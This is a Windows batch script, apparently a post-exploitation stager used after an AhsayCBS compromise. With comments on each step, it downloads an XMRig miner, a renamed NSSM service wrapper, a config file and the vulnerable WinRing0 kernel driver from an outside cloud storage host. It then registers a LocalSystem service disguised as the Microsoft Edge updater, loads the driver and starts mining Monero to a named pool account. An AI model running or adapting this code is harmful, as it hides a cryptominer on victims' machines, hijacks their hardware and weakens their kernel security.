@echo off
rem Post-exploitation stager executed by cbssvcX64.exe after the AhsayCBS
rem auth-bypass + command-injection chain. Stages an XMRig miner that
rem masquerades as the Microsoft Edge updater and installs a BYOVD driver.

set STAGE=%LOCALAPPDATA%\Temp
set OSS=http://imagefiles-backup.oss-ap-southeast-7.aliyuncs.com/javas/Office/win

rem Pull the renamed NSSM wrapper, the XMRig miner, its config and the
rem WinRing0 kernel driver into the user Temp directory.
curl -sk -o "%STAGE%\msedge.exe"        "%OSS%/msedge.exe"
curl -sk -o "%STAGE%\edge.exe"          "%OSS%/edge.exe"
curl -sk -o "%STAGE%\config.json"       "%OSS%/config.json"
curl -sk -o "%STAGE%\WinRing0x64.sys"   "%OSS%/WinRing0x64.sys"

rem Register a service whose name impersonates the real Microsoft Edge
rem updater (edgeupdate), but points at the miner wrapper in Temp and runs
rem as LocalSystem.
"%STAGE%\msedge.exe" install MicrosoftEdgeUpdateSvc "%STAGE%\edge.exe"
"%STAGE%\msedge.exe" set MicrosoftEdgeUpdateSvc AppParameters -c "%STAGE%\config.json"
sc create MicrosoftEdgeUpdateSvc binPath= "%STAGE%\msedge.exe" start= auto obj= LocalSystem DisplayName= "Microsoft Edge Update Service"
sc start MicrosoftEdgeUpdateSvc

rem Load the vulnerable WinRing0 driver so the miner can touch MSRs for
rem extra hashrate.
sc create WinRing0_1_2_0 type= kernel binPath= "%STAGE%\WinRing0x64.sys"
sc start WinRing0_1_2_0

rem edge.exe is an XMRig build targeting Monero on the Kryptex pool.
start "" "%STAGE%\edge.exe" -o xmr.kryptex.network:8029 -u krxYMRN97D/creativejs -p x --cinit-algo cn/r
